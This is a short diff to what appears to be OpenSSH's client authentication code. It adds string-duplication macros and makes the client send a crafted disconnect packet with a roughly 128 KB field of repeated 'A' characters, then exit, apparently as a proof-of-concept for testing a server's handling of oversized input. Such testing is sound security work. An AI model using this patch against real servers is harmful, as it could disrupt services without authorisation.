@@ -23,6 +23,16 @@
  * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
  * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
  */
+#define DUP2(str) str str
+#define DUP4(str) DUP2(str) DUP2(str)
+#define DUP8(str) DUP4(str) DUP4(str)
+#define DUP16(str) DUP8(str) DUP8(str)
+#define DUP32(str) DUP16(str) DUP16(str)
+#define DUP64(str) DUP32(str) DUP32(str)
+#define DUP128(str) DUP64(str) DUP64(str)
+#define DUP256(str) DUP128(str) DUP128(str)
+#define DUP512(str) DUP256(str) DUP256(str)
+#define DUP1024(str) DUP512(str) DUP512(str)
 
 #include "includes.h"
 
@@ -539,10 +549,31 @@ userauth(struct ssh *ssh, char *authlist)
 	}
 	for (;;) {
 		Authmethod *method = authmethod_get(authlist);
-		if (method == NULL)
+		if (method == NULL) {
 			fatal("%s@%s: Permission denied (%s).",
 			    authctxt->server_user, authctxt->host, authlist);
+		}
 		authctxt->method = method;
+
+		// sshpkt_start(ssh, SSH2_MSG_SERVICE_REQUEST);
+		// sshpkt_put_cstring(ssh, DUP128(DUP1024("A")));
+		// sshpkt_send(ssh);
+		// debug2("it worked");
+
+
+		// for (int i=0; i<10; i++) {
+			sshpkt_start(ssh, SSH2_MSG_DISCONNECT);
+			sshpkt_put_u32(ssh, SSH2_DISCONNECT_AUTH_CANCELLED_BY_USER);
+			sshpkt_put_cstring(ssh, DUP128(DUP1024("A")));
+			// sshpkt_put_cstring(ssh, DUP128("A"));
+			sshpkt_put_cstring(ssh, "");
+			sshpkt_send(ssh);
+			ssh_packet_write_wait(ssh);
+			debug2("it worked");
+		// }
+
+
+		fatal("done");
 
 		/* reset the per method handler */
 		ssh_dispatch_range(ssh, SSH2_MSG_USERAUTH_PER_METHOD_MIN,
